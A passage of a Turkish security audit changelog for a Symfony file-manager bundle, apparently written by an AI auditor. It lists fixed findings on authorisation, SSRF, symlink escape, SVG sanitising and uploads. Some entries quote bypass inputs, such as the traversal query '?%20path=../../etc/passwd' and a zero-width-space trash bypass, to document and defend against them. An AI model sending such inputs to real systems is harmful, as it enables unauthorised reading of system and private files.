  - **Dosya:** `src/Metadata/JsonFileMetadataStorage.php`
  - **Bulgu:** Mevcut metadata JSON dosyası geçici I/O hatası veya bozulma nedeniyle okunamadığında `save()` boş diziyle üzerine yazarak tüm varlık metadata kayıtlarını silebiliyordu.
  - **Düzeltme:** `readCurrentUnderLock()` bozuk veya okunamayan mevcut dosya üzerinde sessiz sıfırlama yerine `RuntimeException` fırlatarak veriyi korudu (fail-closed).

- [x] **P14-11 [YÜKSEK] `StorageQuotaChecker` — Üst Sınıra Ulaşan (Capped) Kota Hesabında Fail-Closed & Yalnızca Dosya Sayacı**
  - **Dosya:** `src/Service/StorageQuotaChecker.php`
  - **Bulgu:** Çok büyük depolarda tarama tavanına (cap) ulaşıldığında kota kontrolü kısmi toplamla geçiş izni verebiliyor ve klasör düğümlerini dosya sayacına katabiliyordu.
  - **Düzeltme:** Tavan aşımında `assertQuotaAllows()` güvenli biçimde reddedecek (fail-closed) şekilde sertleştirildi, sayaç yalnızca gerçek dosyalara sınırlandı ve `getDetailedBreakdown()` ata klasör yetkilendirmesi (`isPathAndAncestorsGranted`) ile korundu.

- [x] **P14-12 [PERFORMANS] `DuplicateDetector`, `FileOperationsService`, `DirectoryCacheManager`, `MessageTranslator` & `UnicodeHelper` Optimizasyonları**
  - **Dosyalar:** `src/Service/DuplicateDetector.php`, `src/Service/FileOperationsService.php`, `src/Service/DirectoryCacheManager.php`, `src/Service/MessageTranslator.php`, `src/Util/UnicodeHelper.php`
  - **Bulgu:** `DuplicateDetector` çok sayıda eşit boyutlu dosyada sınırsız bulut okuması ve gereksiz `fileExists()` yapabiliyordu; `FileOperationsService::rename()` bulutta gereksiz ikinci alt ağaç doğrulaması çalıştırabiliyordu; `DirectoryCacheManager` jenerasyon anahtarları süresiz büyüyebiliyordu; `MessageTranslator` izinli dil haritasını her çağrıda yeniden kuruyor ve `UnicodeHelper::$collators` üst sınırsız büyüyebiliyordu.
  - **Düzeltme:** `DuplicateDetector` aday sayısını `MAX_CANDIDATES_PER_UPLOAD = 25` ve sınırlı akış okumasıyla kısıtlayıp gereksiz `fileExists()` çağrısını kaldırdı; yeniden adlandırmada gereksiz bulut taraması atlandı; cache jenerasyonlarına `expiresAfter(2_592_000)` (`30 gün`) eklendi; `MessageTranslator` izinli dil haritasını önbellekledi ve `UnicodeHelper::$collators` `64` girdide sınırlandırıldı.

- [x] **P14-13 [GLOBAL ÇOK-DİLLİ] `FilenameNormalizer` — CJK Tam-Genişlikli Bölü (`／`) & Dinamik `254 - strlen($ext)` Uzun Uzantı Sınırı**
  - **Dosya:** `src/Service/FilenameNormalizer.php`
  - **Bulgu:** `slugger: false` iken `請求書／2026.pdf` içindeki tam-genişlikli bölü işareti (`U+FF0F`) temizlenmeden geçip sonraki `PathNormalizer` aşamasında hata veriyordu; uzun uzantı + `prepend`/`append` birleşiminde dosya adı 255 baytı aşabiliyordu.
  - **Düzeltme:** CJK tam-genişlikli bölü (`／`) ve NFKC eğik çizgi karakterleri `-` ile değiştirildi; `joinFilename()` gövde kesme üst sınırını `254 - strlen($ext)` olarak dinamik hesapladı.

- [x] **P14-14 [ORTA] `AssetUsageGuardService` — Hostsuz `https:foo` / `https:///foo` Düzenleme URL'lerinin Reddi**
  - **Dosya:** `src/Service/AssetUsageGuardService.php`
  - **Bulgu:** Harici `editUrl` doğrulaması yalnızca şema öneki kontrolüyle hostsuz `https:foo` ve `https:///foo` değerlerini geçirebiliyordu.
  - **Düzeltme:** Mutlak URL'lerde açık `https?://` yapısı ve boş olmayan `host` zorunlu kılındı.

- [x] **P14-15 [GLOBAL ÇOK-DİLLİ] `SymfonyAiAssetEnricher` — Çok-Dilli LLM Red Yanıtlarının Filtrelenmesi**
  - **Dosya:** `src/Bridge/SymfonyAI/SymfonyAiAssetEnricher.php`
  - **Bulgu:** LLM görseli reddettiğinde (`Üzgünüm, bu görseli analiz edemiyorum`, `Désolé...`, `آسف...`, `申し訳ありません...`) düz metin fallback bu red cümlesini SEO `alt` metni olarak kaydedebiliyordu.
  - **Düzeltme:** Çok-dilli (EN/TR/FR/DE/ES/AR/FA/RU/JA/ZH/KO) LLM red kalıpları tespit edilerek SEO `alt` alanına yazılması engellendi; geçerli düz metin açıklamalar korundu.

- [x] **P14-16 [CLI SERTLEŞTİRME] Tüm Konsol Komutlarında Yol, Hedef ve Önbellek Anahtarı Güvenliği**
  - **Dosyalar:** `src/Command/{InstallSkills,ThumbnailClear,OptimizeImages,CacheClear,EnrichMetadata,ThumbnailWarmup,StorageStats,Duplicates,TrashPurge,Doctor}Command.php`
  - **Bulgu:** `InstallSkillsCommand` `--dir=.` ile proje köküne dosya yazma riski taşıyordu; `CacheClearCommand` tek dizin temizliğinde paylaşımlı volume meta anahtarlarını (`TREE_CACHE_KEY`, kota ve hash önbellekleri) temizlemiyordu; CLI komutları arasında kenar durum tutarsızlıkları mevcuttu.
  - **Düzeltme:** `InstallSkillsCommand` `.` ve `./.` gibi kök hedefleri reddetti; `CacheClearCommand` ilgili volume meta önbellek anahtarlarını da temizledi; tüm 10 konsol komutunda doğrulama ve hata çıkışları sertleştirildi.

- [x] **P14-17 [FRONTEND PERFORMANS & BELLEK] `browser_controller.js` — Lazy Klasör Ağacı, `recursiveItems` Temizliği, `MAX_SCAN_DIRS = 250` & `disconnect()` Hijyeni**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** `show_folder_tree: false` iken dahi başlangıçta tam klasör ağacı çekiliyordu; silme/taşıma sonrası `recursiveItems` önbelleği bayat kalabiliyordu; özyinelemeli klasör sürükle-bırak taraması sınırsızdı ve `disconnect()` sırasında `retryTimer`, `_editorRenderRaf` ve `zipAbortController` kaynakları açık kalabiliyordu.
  - **Düzeltme:** `show_folder_tree: false` durumunda ağaç isteği yalnızca Taşıma modalı açıldığında tembel (lazy) yüklendi; `recursiveItems` önbelleği tüm mutasyonlarda geçersiz kılındı; sürükle-bırak klasör taramasına `MAX_SCAN_DIRS = 250` + `isDisconnected` sınırı ve `disconnect()` tam kaynak temizliği eklendi.

- [x] **P14-18 [FRONTEND GÜVENLİK & UX] `browser_controller.js`, `dialog_controller.js` & `file_manager_api.js` — `sanitizeInlineSvg()` `data-*`, `openFileManager(null)`, `defaultPrevented`, DevTools & Çapraz-Volume Etiketi**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `assets/controllers/dialog_controller.js`, `assets/js/file_manager_api.js`
  - **Bulgu:** Satır içi SVG ikon sanitizasyonu `data-*` (Stimulus controller enjeksiyon vektörü) ve tüm URI özniteliklerini temizlemiyordu; `openFileManager(null)` `TypeError` verebiliyordu; `dialog_controller.js` iptal edilmiş (`defaultPrevented`) olayları işleyebiliyordu; `Ctrl+Shift+I` tarayıcı DevTools kısayolu inspector ile çakışıyordu; taşıma modalında çapraz-volume kaynak etiketi ve güvenli olmayan HTTP ortamında pano fallback eksikti; Lightbox açılırken inspector medyası çalmaya devam ediyordu.
  - **Düzeltme:** `sanitizeInlineSvg()` `localName.startsWith('on')`, `data-*` ve tüm URI özniteliklerini temizledi (`<linearGradient id="...">` korunarak); `openFileManager(null)` ve `event?.defaultPrevented` korumaları, `!event.shiftKey` DevTools koruması, `sourceVolume` yakalama, `copyTextToClipboard()` fallback, Lightbox açılışında inspector medyası duraklatma, boyutu olmayan SVG için `'—'` gösterimi ve kaydırma sıçramasız `renderSidebarTree(false)` eklendi.

- [x] **P14-19 [ERİŞİLEBİLİRLİK, MOBİL & RTL] `core.css`, `browser_controller.js` & Twig Şablonları**
  - **Dosyalar:** `assets/styles/core.css`, `assets/controllers/browser_controller.js`, `templates/base/layout.html.twig`, `templates/base/parts/{_sidebar,_topbar,_main,_overlays,_settings_popover}.html.twig`, `templates/form/picker.html.twig`
  - **Bulgu:** Mobil tarayıcılarda `100vh` adres çubuğu taşması yapabiliyor, dokunmatik ve klavye odaklı seçim kutuları gizli kalabiliyor, Lightbox CSS kuralları dağınık duruyor, `[data-job-status]` ile picker BiDi yönlendirmesi RTL'de bozulabiliyor ve ağaç/taşıma modalında klavye erişilebilirliği ile modal kapanışında odak geri yükleme eksikti.
  - **Düzeltme:** `100dvh` desteği, dokunmatik/odak checkbox görünürlüğü, konsolide Lightbox kuralları, `[data-job-status]` & picker BiDi düzeltmeleri, klasör ağacı/taşıma modalı klavye gezinmesi ve modal kapanış odak geri yüklemesi uygulandı.

- [x] **P14-20 [DOĞRULAMA] Pass-14 Kapsamlı Regresyon Test Paketleri**
  - **Dosyalar:** `tests/Unit/Security/FourteenthPassGlobalSecurityAuditTest.php`, `tests/Js/frontend_audit_test.mjs` (Test 18)
  - **Doğrulanan QA Kapısı (Tamamı 0 Hata / 0 Uyarı):**
    - `php -l` (`src/` + `tests/`): **`154/154` dosya**, `0` sözdizimi hatası.
    - PHPStan Level 8: **`0` hata**.
    - PHPUnit 13.4.8: **`318/318` test PASS**, **`3.210` assertion**, `0` hata, `0` başarısızlık, `0` uyarı.
    - `node --check` (`assets/**/*.js`): **`7/7` dosya**, `0` hata.
    - `node --test` (`tests/Js/*.mjs`): **`32/32` test PASS**, `0` başarısızlık.
    - `bin/console lint:twig`: **`33/33` şablon OK**; `bin/console lint:yaml`: **`3/3` çeviri dosyası OK**.
    - `bin/console cache:clear --env=dev` + derlenmiş `getDirectoryListerService.php` `php -l`: **OK (`No syntax errors detected`)**.

---

## 16. 15. Tur (Pass-15) — 25.11.2026 — Pass-14 Tutarlılık Doğrulaması + Sistemik Symlink/Ata-Yetki/HTTP Range/SVG/DBAL/Frontend/Erişilebilirlik/Global Çok-Dilli Denetim

> **Denetçi Model & Versiyon:** Google Antigravity — Gemini 4 (Extra High Reasoning)  
> **Denetim Kapsamı:** Pass-14 düzeltmelerinin tutarlılık/regresyon doğrulaması (`T15-01..T15-10`) + tüm bundle genelinde (Security, Storage, Controllers, Listeners, DBAL, CLI, JS/Stimulus, WYSIWYG, CSS, Twig, i18n, A11y) hacker perspektifli yeni açık, mantık, eşzamanlılık, performans ve global çok-dilli Unicode/RTL/IME taraması (`P15-01..P15-17`).

### 16.1. Pass-14 Doğrulama ve Tutarlılık Bulguları (`T15-01` – `T15-10`)

- [x] **T15-01 [KRİTİK] `FileManagerAuthorizer` & Tüm Endpoint/Servisler — Sadece Bölü (`/` / `///`) Fail-Open Açığı ve Sistemik Ata-Klasör Voter Zorunluluğu**
  - **Dosyalar:** `src/Security/FileManagerAuthorizer.php`, `src/Controller/{Api,Download,ImageEditor,Thumbnail,ZipDownload}Controller.php`, `src/Service/{DirectoryLister,FileOperationsService,UploadManager,RemoteUrlImporter,TrashManager,ZipArchiveService,ShareLinkService,AssetEnrichmentService}.php`, `src/Twig/Components/BrowserComponent.php`
  - **Bulgu:** `isPathAndAncestorsGranted()` içinde `'/'` veya `'///'` gibi yalnızca bölü işareti içeren yollarda `$segments === []` oluştuğu için döngü çalışmadan `true` (fail-open) dönüyordu; ayrıca birçok denetleyici ve servis hâlâ yalnızca yaprak yol üzerinde `isGranted()` çağırarak özel bir Voter tarafından reddedilen ata klasör (`restricted/sub/file.txt`) kuralını atlatabiliyordu (`DirectoryLister::list()` ve `searchRecursive()` doğrudan çağrıldığında da ata klasör erişim reddi fırlatılmıyordu).
  - **Düzeltme:** `$segments === []` durumunda kök `''` üzerinden fail-closed yetkilendirme yapıldı; ara ata klasörlerde hem `VIEW` hem hedef `$attribute` doğrulandı; `assertPathAndAncestorsGranted()` eklenip tüm denetleyici ve servislere (`Download`, `Thumbnail`, `ZipDownload`, `ImageEditor`, `Api`, `BrowserComponent`, `ShareLink`, `AssetEnrichment`, `FileOperations`, `UploadManager`, `RemoteUrlImporter`, `TrashManager`, `ZipArchive`, `DirectoryLister::list/searchRecursive`) bağlandı; `ImageEditorController` için kaynak dosya `SAFE_RASTER_EXTENSIONS` ve `saveMode === 'copy'` sonrası `UPLOAD` yetki doğrulaması eklendi.

- [x] **T15-02 [KRİTİK] `FileManagerPickerType`, `FileManagerTwigExtension`, `picker_controller.js` & 3 WYSIWYG Adaptörü — Başta Boşluklu Sorgu HPP (`?%20path=`, `?+path=`, `?+path[]=`), `\` Yetki Ayracı Bypass'ı ve İç İçe Özel Çöp Dizini**
  - **Dosyalar:** `src/Form/FileManagerPickerType.php`, `src/Twig/Extension/FileManagerTwigExtension.php`, `assets/controllers/picker_controller.js`, `assets/controllers/browser_controller.js`, `assets/js/integrations/{ckeditor5,tinymce,tiptap}_adapter.js`
  - **Bulgu:** PHP `parse_str()` ve Symfony `Request::query` baştaki boşlukları kırptığından `?%20path=../../etc/passwd`, `?+path=..`, `?path=ok&+path=..` veya `?+path[]=ok` sorgu anahtarları katı `=== 'path'` eşleşmesini atlatabiliyordu; ayrıca `https://example.com\..\.trash\secret.png` gibi `?`/`#` öncesi `\` içeren URL'ler WHATWG/tarayıcı ayrıştırıcılarında yol ayracı olarak yorumlanıyordu; özel `trash.directory` (`system/trash`) ve profil `exclude_patterns` kuralları `PickerType` public URL ve `FileManagerTwigExtension::describeRelativePathFieldItem()` içinde tam uygulanmıyordu.
  - **Düzeltme:** Tüm PHP ve JS URL doğrulayıcılarında `?`/`#` öncesi `\` koşulsuz reddedildi, sorgu anahtarları `ltrim` + `strtolower` (JS `trimStart().toLowerCase()`) ile normalize edilip PHP tarafında `parse_str()` ikinci katman kontrolü eklendi; `%00..%1F/%7F` kodlanmış kontrol baytları JS'te de reddedildi; `PickerType::isUrlAccessibleForProfile()` `urlPrefix` yolunu soyarak iç içe `trash.directory` alt yollarını doğruladı ve `FileManagerTwigExtension` profil `assertAccessiblePath()` kuralını uyguladı.

- [x] **T15-03 [YÜKSEK] `FileSecurityGuard` & `Configuration` — Aktif Web Uzantıları (`.mht`/`.xhtm`/`.jhtml`/`.wml`/`.svg2`), `application/octet-stream` MIME Reddi, Boşluk+ZWSP Özel Çöp Bypass'ı ve İç DTD Alt Kümeli SVG**
  - **Dosyalar:** `src/Security/FileSecurityGuard.php`, `src/DependencyInjection/Configuration.php`
  - **Bulgu:** `.mht`, `.xhtm`, `.jhtml`, `.wml`, `.svg2` gibi aktif içerik uzantıları ve ilgili MIME türleri engelli listede yoktu; `STRICT_BINARY_EXTENSIONS` için `application/octet-stream` geçişine izin verilebiliyordu; boşluk içeren özel `trash.directory` (örn. `my trash`) içine sıfır genişlikli karakter (`my\u{200B} trash`) eklenerek çöp koruması atlatılabiliyordu; `<!DOCTYPE svg [<!ELEMENT foo ANY>]>` iç DTD alt kümesindeki `>` karakteri `looksLikeSvgDocument()` taramasını erken sonlandırıyordu.
  - **Düzeltme:** Yeni aktif uzantı/MIME'lar engellendi; katı ikili uzantılarda `application/octet-stream` reddedildi; `$trashSkeleton` karşılaştırması ile boşluk+ZWSP bypass'ı kapatıldı; `looksLikeSvgDocument()` 256 KB tarama penceresi, tırnak/köşeli parantez duyarlı `findDoctypeEndOffset()` ve kapanmamış dev XML öndeyişlerinde fail-closed davranış ile sertleştirildi.

- [x] **T15-04 [YÜKSEK] `dialog_controller.js` & `browser_controller.js` — W3C CSS Yeni Satır String Kırılımı, `element()` Fonksiyonu ve `ev:onclick` Ad Alanlı Event Temizliği**
  - **Dosyalar:** `assets/controllers/dialog_controller.js`, `assets/controllers/browser_controller.js`
  - **Bulgu:** W3C CSS Syntax §4.3.5'e göre tırnak içindeki kaçışsız yeni satır (`\n`) string'i sonlandırır (bad-string token), ancak eski regex yeni satırları string içinde tutup ardından gelen `url(...)` çağrısını maskeleyebiliyordu; `(?:-moz-)?element(` engellenmiyordu ve `dialog_controller.js` ad alanlı `ev:onclick` / `ns:srcdoc` özniteliklerini yalnızca tam adla kontrol ediyordu.
  - **Düzeltme:** Her iki CSS doğrulayıcıda yeni satırla sonlanan W3C string regex'i (`[^"\\\r\n\f]*`) ve `(?:-moz-)?element\(` kuralı uygulandı; `dialog_controller.js` `localName.startsWith('on')` ve `localName === 'srcdoc'` temizliği eklendi.

- [x] **T15-05 [REGRESYON / RTL] `_overlays.html.twig` — Lightbox Gezinme Oklarında Pass-14 Çift Aynalama (Double-Mirroring) Hatası**
  - **Dosyalar:** `templates/base/parts/_overlays.html.twig`, `tests/Js/frontend_audit_test.mjs`
  - **Bulgu:** Pass-14'te `_overlays.html.twig` içine eklenen `{{ this.isRtl ? '›' : '‹' }}` ifadesi, `core.css:4370`'teki `[dir="rtl"] [data-lb-nav] { transform: scaleX(-1); }` kuralıyla üst üste binerek RTL modunda okları iki kez çevirip tekrar LTR yönüne döndürüyordu.
  - **Düzeltme:** Şablonda kanonik `‹` (`prev`) ve `›` (`next`) karakterlerine dönüldü; tekil RTL aynalaması CSS kuralına bırakıldı ve `_topbar.html.twig` içindeki Geri/İleri tooltip kısayolları `(Alt+→ / Alt+←)` RTL'ye uyarlandı.

- [x] **T15-06 [ORTA / PERFORMANS] `browser_controller.js` — Gizli Klasör Ağacında Gereksiz `/tree` İstekleri ve Boş Kök Volume Yeniden Çekim Döngüsü**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** `show_folder_tree: false` iken `refreshFullTree()` ağ isteği göndermeye devam edebiliyor ve 0 alt klasörlü (düz) bir diskte `toggleSidebar()` `cached.length === 0` nedeniyle her açma/kapamada `/tree` isteğini tekrarlıyordu.
  - **Düzeltme:** `refreshFullTree(force, serverRefresh, allowHidden = false)` kenar çubuğu gizliyken (`allowHidden === false`) ağ isteğini atlayıp zorunlu yenilemede yalnızca bayat önbelleği silecek şekilde güncellendi; `openMoveModal()` `allowHidden = true` ve yükleme göstergesiyle çağırıldı; `toggleSidebar()` yalnızca `!this.treeCache.has(this.volumeValue)` kontrolüne bağlandı.

- [x] **T15-07 [ORTA] `browser_controller.js` — `goBack()`/`goForward()` Başarısız Navigasyonda Hatalı Geçmiş Geri Alma & Çöp Kutusu Breadcrumb Ezilmesi**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** `goBack()` ve `goForward()`, `navigateTo()` çağrısından önce `this.historyIndex`'i değiştiriyordu; bu yüzden `navRollbackBase` hatalı yeni indeksi kaydedip başarısız istekte geri alamıyordu; ayrıca Çöp Kutusundan yapılan başarısız bir navigasyon geri alınırken Çöp Kutusu breadcrumb'ı normal klasör breadcrumb'ıyla eziliyordu.
  - **Düzeltme:** `targetHistoryIndex` seçeneği `navigateTo()` içinde `navRollbackBase` alındıktan sonra uygulandı ve `prevTrashMode === true` geri alımında `syncTrashUi()` çağrıldı.

- [x] **T15-08 [ORTA] `browser_controller.js` — `openDeleteModal()` Kullanım Kontrolünde (Usage Guard) Eksik `volume` Parametresi**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Onay modalı açıkken çağrılan `checkUsage` aksiyonu `sourceVolume` değerini göndermiyordu; bu nedenle kullanıcı modal açıkken volume değiştirirse yanlış volume sorgulanabiliyordu.
  - **Düzeltme:** `callActionJson('checkUsage', { paths, volume: sourceVolume }, { silent: true })` ile yakalanan kaynak volume geçirildi.

- [x] **T15-09 [YÜKSEK / DI] `DetectExternalVotersPass` — Doğrudan `AccessDecisionManagerInterface`, Bağlı `$authChecker` ve Etiketsiz Özel Voter Tespiti**
  - **Dosya:** `src/DependencyInjection/Compiler/DetectExternalVotersPass.php`
  - **Bulgu:** `security.access.decision_manager` / `AccessDecisionManagerInterface` argüman `0` içine doğrudan eklenen etiketsiz (`security.voter` etiketi taşımayan) özel voter'lar veya `DirectoryLister::$authChecker` üzerine doğrudan bağlanan özel denetleyiciler gözden kaçabiliyordu.
  - **Düzeltme:** `AccessDecisionManagerInterface::class`, `DirectoryLister::$authChecker` referansı ve `hasUntaggedCustomVotersInDecisionManager()` taraması eklendi.

- [x] **T15-10 [ORTA] `DoctrineDbalMetadataStorage` — Kök Önek `'local::'` Çift Bölü Hatası, PostgreSQL B-Tree Aralık/Eşitlik Taraması & Toplu Ekleme (`insertRowsBatch`)**
  - **Dosya:** `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`
  - **Bulgu:** Kök önek `'local::'` için `buildChildPrefix()` hatalı `'local::/'` üretiyordu; PostgreSQL'de `LEFT(canonical_key, 191) LIKE :prefix191` standart B-Tree indeksini (non-C locale'de `varchar_pattern_ops` olmadan) kullanamıyordu; büyük klasör kopyalamalarında satır başına tek tek `INSERT` atılıyordu.
  - **Düzeltme:** `'local::'` kök önek desteği düzeltildi; PostgreSQL için kısa öneklerde `LEFT(canonical_key, 191) >= :rangeStart AND LEFT(canonical_key, 191) <= :rangeEnd`, ≥191 karakterli öneklerde `LEFT(canonical_key, 191) = :prefix191` B-Tree indeks dostu sorgularına geçildi ve `insertRowsBatch()` ile 100 satırlık toplu ekleme uygulandı.

### 16.2. Yeni Pass-15 Güvenlik, Eşzamanlılık, Performans, A11y ve Global Çok-Dilli Bulguları (`P15-01` – `P15-17`)

- [x] **P15-01 [KRİTİK] `ConfinedLocalFilesystemAdapter` — Yerel Diskte Sembolik Bağlantı (Symlink) Kaçışı ve `DISALLOW_LINKS` Listeleme DoS'u**
  - **Dosyalar:** `src/Storage/ConfinedLocalFilesystemAdapter.php` (yeni), `src/Storage/FlysystemStorageFactory.php`
  - **Bulgu:** Flysystem v3 `LocalFilesystemAdapter::DISALLOW_LINKS` yalnızca `listContents()` çağrısında symlink'i engeller (ve tek bir stray symlink tüm dizin listesini 500 ile çökertir); doğrudan `read`, `write`, `delete`, `deleteDirectory`, `move`, `copy`, `fileExists`, `mimeType` çağrıları mevcut bir symlink'i takip ederek volume kökünden dışarı çıkabiliyordu.
  - **Düzeltme:** `LocalFilesystemAdapter::SKIP_LINKS` sarmalayan `ConfinedLocalFilesystemAdapter` oluşturuldu; her Flysystem işleminde tüm yol segmentleri `is_link()` ve `realpath()` kök kuşatması (`isWithinRoot`) ile doğrulandı; `deleteDirectory()` alt ağaçta iç içe symlink taraması (`assertSubtreeContainsNoSymlinks`) ile korundu ve `FlysystemStorageFactory` yerel disklerde bu adaptörü zorunlu kıldı.

- [x] **P15-02 [YÜKSEK] `ZipArchiveService` — Kısmi ZIP Çıkarma Sonrası Eksik Önbellek/Olay Bildirimi, Eksik Kota Kontrolü, `fread() === false` Sessiz Kesilme ve Dinamik 255-Bayt Çakışma Sınırı**
  - **Dosya:** `src/Service/ZipArchiveService.php`
  - **Bulgu:** Arşiv çıkarma yarıda hata verdiğinde (`evil.php` vb.) önceden çıkarılan dosyalar için `FolderCreatedEvent` fırlatılmıyor ve önbellek bayat kalıyordu; arşiv çıkarmada profil `storage_quota` kontrolü eksikti; 3 akış döngüsünde `fread() === false` kontrolü eksikti ve çakışma yeniden adlandırması uzun çok-baytlı adlarda 255 baytı aşabiliyordu.
  - **Düzeltme:** `finally` bloğunda `$extracted > 0 || $createdDirs > 0` ise özet `FolderCreatedEvent` fırlatıldı; `$quotaChecker?->assertHasQuota()` eklendi; tüm akış okumaları `$chunk === false` için fail-closed yapıldı; `resolveExtractFileCollision()` dinamik 255-bayt gövde sınırı ile korundu.

- [x] **P15-03 [YÜKSEK / EŞZAMANLILIK] `UploadManager` — Parçalı Yükleme Kilit Bölünmesi, Anonim/Kimlikli Oturum Çakışması ve Dinamik 255-Bayt Çakışma Sınırı**
  - **Dosya:** `src/Service/UploadManager.php`
  - **Bulgu:** Parça yazma, birleştirme, iptal (`abortUpload`) ve temizleme arasında ayrı kilit dosyaları yarış durumuna yol açabiliyordu; kimlikli kullanıcı ID'si ile anonim oturum ID'si aynı ad alanında çakışabiliyordu; yetkilendirilen `$effectiveDir` alt çağrılara taşınmıyordu.
  - **Düzeltme:** Tüm parça yaşam döngüsü tek `.session.lock` kilit dosyasında birleştirildi; kimlikli oturumlara `'user:'` öneki, anonim oturumlarda `$req->hasSession() && $req->getSession()->isStarted()` tutarlılığı, yetkilendirilmiş `$effectiveDir` aktarımı ve `resolveOverwritePolicy()` dinamik 255-bayt gövde sınırı uygulandı.

- [x] **P15-04 [YÜKSEK / VERİ KAYBI] `browser_controller.js` — Son Parçada `completed: false` Sessiz Veri Kaybı, %100'de Duraklatma Kilitlenmesi ve 0. Parçada Sunucu Temizliği**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Son yükleme parçasında sunucu `ok: true, completed: false` döndürdüğünde istemci yüklemeyi başarılı sayıp kuyruktan siliyordu (sessiz veri kaybı); son parça uçuş halindeyken `Pause` basılırsa sunucu dosyayı tamamladığı halde istemci %100'de donuyordu; 0. parça yüklenirken iptal edildiğinde `abortUpload` temizliği gönderilmiyordu.
  - **Düzeltme:** Son parçada `data.completed === false` durumunda `job.chunkIndex = 0` sıfırlanıp yeniden denenebilir hata üretildi; son parça sunucuda tamamlandıysa (`data.completed === true || job.chunkIndex >= job.totalChunks`) `job.paused` olsa dahi kuyruk kapatılıp yenileme zamanlandı; 0. parçada aktif/duraklatılmış/hatalı çok-parçalı iptallerde `abortUpload` çağrıldı.

- [x] **P15-05 [YÜKSEK / SSRF] `RemoteUrlImporter` — Katı IPv6 Global Unicast (`2000::/3`) İzin Listesi & Uzantısız SVG Algılama**
  - **Dosya:** `src/Service/RemoteUrlImporter.php`
  - **Bulgu:** IPv6 SSRF kontrolü kara liste yaklaşımı nedeniyle gelecekteki/özel amaçlı aralıkları (`100::/64`, `2001::/23`, `2001:db8::/32`, `2002::/16`, `3fff::/20`) kaçırabiliyordu; uzantısız bir URL'den gelen SVG dosyası `.svg` uzantısı alamayıp SVG sanitizasyon hattına düşmeden düz metin gibi işlenebiliyordu.
  - **Düzeltme:** Eşlenmiş/NAT64 adresleri çözüldükten sonra yalnızca genel yönlendirilebilir IPv6 Global Unicast (`2000::/3` eksi özel IANA aralıkları) izin listesi uygulandı; `extractFilename()` `Content-Type: image/svg+xml` veya `FileSecurityGuard::looksLikeSvgDocument()` ile uzantısız SVG'lere `.svg` ekledi.

- [x] **P15-06 [ORTA / PERFORMANS & VERİ BÜTÜNLÜĞÜ] `ImageOptimizer` — Tersine Çevrilmiş GD PNG Sıkıştırma Seviyesi ve Atomik Yazma**
  - **Dosya:** `src/Service/ImageOptimizer.php`
  - **Bulgu:** GD `imagepng()` kalite ölçeği tersine (0 = sıkıştırmasız, 9 = en yoğun) çalıştığı halde JPEG kalitesi gibi yüksek sayıdan düşük seviyeye çevrilerek PNG dosyaları neredeyse sıkıştırmasız (`0..1`) büyütülüyordu; hedef dosya üzerine doğrudan yazma yarıda kalırsa dosyayı bozabiliyordu.
  - **Düzeltme:** GD PNG için sabit optimal sıkıştırma seviyesi (`7`) ve `writeBlobAtomically()` (aynı dizinde geçici dosya + atomik `rename`) uygulandı.

- [x] **P15-07 [YÜKSEK / BELLEK & ÖNBELLEK] `ThumbnailCleanupListener`, `ThumbnailManager`, `ThumbnailController` & `FileOperationsService`**
  - **Dosyalar:** `src/EventListener/ThumbnailCleanupListener.php`, `src/Event/TrashRestoredEvent.php`, `src/Thumbnail/ThumbnailManager.php`, `src/Controller/ThumbnailController.php`, `src/Service/FileOperationsService.php`, `src/Service/TrashManager.php`
  - **Bulgu:** Klasör silmede `FileOperationsService` ve `ThumbnailCleanupListener` çift thumbnail temizliği yapıyor, tarama limiti tüm dosyaları (raster dışı dahil) sayıyor, fallback `.webp`/`.jpeg` kardeş önbellek dosyaları temizlenmiyor ve `ThumbnailController` SVG'yi sınırsız belleğe okuyordu; `TrashRestoredEvent` klasör/dosya bilgisini taşımıyordu.
  - **Düzeltme:** Çift döngü kaldırıldı (`FileOperationsService` constructor BC korundu); `MAX_FOLDER_SCAN = 5000` yalnızca `SAFE_RASTER_EXTENSIONS` üzerinden sayıldı ve profil hedef listesi tekilleştirildi; `ThumbnailManager` tüm kardeş önbellek uzantılarını kontrol edip temizledi; `ThumbnailController` `SvgSanitizer::MAX_SVG_BYTES` (5 MB) ön kontrol + akış sınırı + `$chunk === false` kontrolü uyguladı; `TrashRestoredEvent::$isFolder` eklendi ve `TrashManager` tekil `.lock` dosyasıyla + dinamik 255-bayt geri yükleme adıyla sertleştirildi.

- [x] **P15-08 [YÜKSEK / XSS & DoS] `SvgSanitizer` — HTML5 Foreign-Content Kırılım Etiketleri İçin Katı İzin Listesi & `<use>` Billion-Laughs Koruması**
  - **Dosya:** `src/Security/SvgSanitizer.php`
  - **Bulgu:** Kara liste yaklaşımı `<br>`, `<plaintext>`, `<xmp>`, `<noembed>`, `<noframes>` gibi HTML5 ayrıştırıcısını SVG bağlamından dışarı çıkaran (breakout) etiketleri geçirebiliyordu; döngüsel veya yüzlerce `<use href="#id"/>` düğümü tarayıcıda üstel bellek/CPU DoS'u (Billion-Laughs) yaratabiliyordu.
  - **Düzeltme:** Kara liste yerine sıkı `ALLOWED_SVG_TAGS` izin listesine geçildi ve `sanitizeUseReferences()` ile maksimum `100` `<use>` düğümü, en fazla `4` referans derinliği ve döngü tespiti uygulandı.

- [x] **P15-09 [YÜKSEK / GİZLİLİK & N+1] `MetadataSyncListener` — Kopya/Klon Sonrası Yetkisiz Alt-Öğe Metadata Sızıntısının Ön-Filtreyle Engellenmesi**
  - **Dosya:** `src/EventListener/MetadataSyncListener.php`
  - **Bulgu:** Eski akış önce tüm kaynak alt ağacın metadatasını hedefe kopyalayıp ardından yetkisiz/hariç tutulan çocukları tek tek silerek geçici bilgi ifşasına (race window) ve N+1 silme sorgusuna yol açıyordu.
  - **Düzeltme:** `copyFilteredFolderMetadata()` hedef dizindeki gerçek dosyaları tek `listContents()` ile toplayıp yalnızca kopyadan sağ çıkan öğelerin metadatasını kaydedecek şekilde yeniden yazıldı.

- [x] **P15-10 [ORTA / STANDART] `HttpByteRangeParser`, `DownloadController`, `ShareController` & `ShareLinkService` — RFC 9110 §14 Byte Range & Tekil Zaman Anlık Görüntüsü**
